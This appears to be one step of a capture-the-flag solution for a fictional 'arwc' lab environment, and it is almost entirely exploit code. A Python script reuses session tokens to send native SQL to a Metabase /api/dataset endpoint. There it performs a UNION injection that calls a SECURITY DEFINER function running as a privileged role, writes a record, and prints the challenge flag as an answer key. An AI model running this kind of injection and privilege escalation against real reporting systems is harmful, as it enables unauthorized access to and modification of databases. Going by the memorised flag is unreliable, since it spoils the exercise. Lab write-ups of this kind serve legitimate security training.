Requires W07.2 (adjustment record read) and W09.4 (integration session / process_session). Use the Metabase `/api/dataset` endpoint to call `arwc_reconcile_copy('REC-CRR-DP3-17')` via UNION injection. The SECURITY DEFINER function runs as `corporate` and writes `REC-CRR-DP3-17-COPY` into `reconciliation_copy`.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca-bundle.pem")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc", "Content-Type": "application/json"}

# Get the planning.query-run route template (points to Metabase /api/dataset).
doc = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://planning-data.arwc.test/.well-known/arwc-client", headers=h),
    context=ctx).read())
query_run_url = next(r["template"] for r in doc["routes"] if r["key"] == "planning.query-run")
# query_run_url = https://reports.arwc.test/api/dataset

# Get the planner session (Metabase session ID) from W06.3.
planner = pathlib.Path("receipts/planner-session").read_text().strip()
mb_h = {"X-Metabase-Session": planner, "Content-Type": "application/json"}

# W07.1: get the query ID and database ID.
# (from the saved-query route discovered via the planning client doc)
# Assume we know the database_id from W07.1; use 1 as default if not saved.
# The injection uses a 5-column UNION to match reserve_report_current's shape.

# Inject via the query-run Metabase native SQL.
# arwc_reconcile_copy returns (copy_id, copy_revision, copy_source, copy_identity, flag).
injection_sql = (
    "SELECT record_id, district, period, amount_ml, detail "
    'FROM "reserve_report_current" WHERE 1=0 '
    "UNION ALL "
    "SELECT copy_id, copy_identity, copy_source, copy_revision::text, flag "
    "FROM arwc_reconcile_copy('REC-CRR-DP3-17')"
)

body = json.dumps({
    "database": 1,  # corporate-db database ID in Metabase (from W07.1)
    "type": "native",
    "native": {"query": injection_sql},
}).encode()
result = json.loads(urllib.request.urlopen(
    urllib.request.Request(query_run_url, data=body, headers=mb_h, method="POST"),
    context=ctx, timeout=30).read())

rows = result["data"]["rows"]
cols = [c["name"] for c in result["data"]["cols"]]
copy = dict(zip(cols, rows[0]))
print("copy_id:", copy.get("record_id", copy.get("copy_id")))
# REC-CRR-DP3-17-COPY
print("identity:", copy.get("district", copy.get("copy_identity")))
# corporate (SECURITY DEFINER owner)
print("flag:", copy.get("detail", copy.get("flag")))
# FLAG{9f7a03ecbffb3005}
```

The function runs as `corporate` (SECURITY DEFINER) and writes `REC-CRR-DP3-17-COPY` into `reconciliation_copy`. Calling it again increments the revision. The flag appears in the `flag` column of the returned record (fifth column, mapped to `detail` in the UNION shape).

Flag: `FLAG{9f7a03ecbffb3005}` in the `flag` column of the function result.
